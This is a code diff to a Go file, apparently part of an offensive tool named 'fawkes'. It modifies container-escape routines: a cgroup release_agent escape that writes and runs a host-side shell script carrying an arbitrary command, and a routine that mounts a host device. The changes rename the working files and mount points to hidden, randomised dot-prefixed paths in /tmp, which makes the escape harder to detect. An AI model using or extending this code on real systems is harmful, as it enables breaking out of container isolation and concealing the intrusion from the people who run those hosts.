@@ -10,6 +10,7 @@ import (
 	"path/filepath"
 	"strings"
 	"syscall"
+	"time"
 
 	"fawkes/pkg/structs"
 )
@@ -284,7 +285,7 @@ func escapeCgroupNotify(command string) (string, string) {
 	sb.WriteString("[*] Attempting cgroup release_agent escape\n")
 
 	// Create a temp cgroup
-	cgroupDir := "/tmp/cgrp_escape"
+	cgroupDir := fmt.Sprintf("/tmp/.cg_%d", time.Now().UnixNano()%100000)
 	if err := os.MkdirAll(cgroupDir, 0o755); err != nil {
 		return fmt.Sprintf("Failed to create cgroup dir: %v", err), "error"
 	}
@@ -322,8 +323,8 @@ func escapeCgroupNotify(command string) (string, string) {
 
 	// Write the release_agent path
 	// We need to know our path on the host — write a script that's accessible from host
-	scriptPath := "/cmd_escape"
-	outputPath := "/output_escape"
+	scriptPath := fmt.Sprintf("/tmp/.r_%d", time.Now().UnixNano()%100000)
+	outputPath := fmt.Sprintf("/tmp/.o_%d", time.Now().UnixNano()%100000)
 
 	// Write script
 	script := fmt.Sprintf("#!/bin/sh\n%s > %s 2>&1\n", command, outputPath)
@@ -441,7 +442,7 @@ func escapeMountHost(devicePath string) (string, string) {
 		}
 	}
 
-	mountPoint := "/tmp/hostfs_escape"
+	mountPoint := fmt.Sprintf("/tmp/.mnt_%d", time.Now().UnixNano()%100000)
 	if err := os.MkdirAll(mountPoint, 0o755); err != nil {
 		return fmt.Sprintf("Failed to create mount point: %v", err), "error"
 	}
